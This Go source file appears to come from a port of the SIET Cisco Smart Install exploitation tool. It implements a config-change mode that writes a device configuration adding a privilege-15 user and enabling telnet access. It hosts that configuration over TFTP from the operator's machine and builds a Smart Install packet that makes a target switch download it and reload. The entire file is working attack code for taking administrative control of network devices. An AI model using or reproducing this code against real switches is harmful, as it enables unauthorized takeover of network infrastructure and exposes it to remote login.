package libs

import (
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// ChangeConfigMode handles the configuration change functionality
func (s *SIETClient) ChangeConfigMode() {
	if s.Config.IP == "" {
		fmt.Println("Error: No target IP specified for config change")
		os.Exit(1)
	}
	
	configFile := s.prepareConfigFile()
	if configFile == "" {
		fmt.Println("Error: Could not prepare configuration file")
		os.Exit(1)
	}
	
	s.changeDeviceConfig(s.Config.IP, configFile)
}

// prepareConfigFile prepares the configuration file for upload
func (s *SIETClient) prepareConfigFile() string {
	tftpDir := "tftp"
	os.MkdirAll(tftpDir, 0755)
	
	if s.Config.ConfigFile != "" {
		// Copy user-specified config file
		destFile := filepath.Join(tftpDir, "user.conf")
		err := s.CopyFile(s.Config.ConfigFile, destFile)
		if err != nil {
			fmt.Printf("Error copying config file: %v\n", err)
			return ""
		}
		return "user.conf"
	}
	
	// Create default configuration
	defaultConfig := fmt.Sprintf(`username %s privilege 15 secret 0 %s
interface Vlan1
 ip address dhcp
 no shutdown
line vty 0 4
 login local
 transport input telnet
end
`, s.Config.Username, s.Config.Password)
	
	configPath := filepath.Join(tftpDir, "default.conf")
	err := os.WriteFile(configPath, []byte(defaultConfig), 0644)
	if err != nil {
		fmt.Printf("Error creating default config: %v\n", err)
		return ""
	}
	
	return "default.conf"
}

// changeDeviceConfig sends configuration change packet to device
func (s *SIETClient) changeDeviceConfig(targetIP, configFile string) {
	myIP, err := s.GetLocalIP(targetIP)
	if err != nil {
		fmt.Printf("Error getting local IP: %v\n", err)
		return
	}
	
	if s.Config.PublicIP != "" {
		myIP = s.Config.PublicIP
	}
	
	tftpPath := fmt.Sprintf("tftp://%s/%s", myIP, configFile)
	packet := s.buildChangeConfigPacket(tftpPath, s.Config.ReloadTime)
	
	err = s.SendPacketToDevice(targetIP, packet)
	if err != nil {
		fmt.Printf("Error sending config change packet: %v\n", err)
		return
	}
	
	fmt.Printf("[INFO]: Configuration change packet sent to %s\n", targetIP)
}

// buildChangeConfigPacket builds the Smart Install packet for configuration change
func (s *SIETClient) buildChangeConfigPacket(tftpPath, reloadTime string) []byte {
	// Parse reload time
	parts := strings.Split(reloadTime, ":")
	hours, _ := strconv.Atoi(parts[0])
	minutes, _ := strconv.Atoi(parts[1])
	
	// Build packet (simplified version)
	header := "000000010000000100000003000001280000000300000000000000000000000200000000000000010000"
	
	headerBytes, _ := hex.DecodeString(header)
	
	// Add time bytes
	timeBytes := []byte{byte(hours), 0, 0, 0, 0, 0, byte(minutes), 0}
	
	// Add padding and TFTP path
	padding := make([]byte, 264)
	pathBytes := []byte(tftpPath)
	pathPadding := make([]byte, 264-len(pathBytes))
	
	packet := append(headerBytes, timeBytes...)
	packet = append(packet, padding...)
	packet = append(packet, pathBytes...)
	packet = append(packet, pathPadding...)
	
	return packet
}
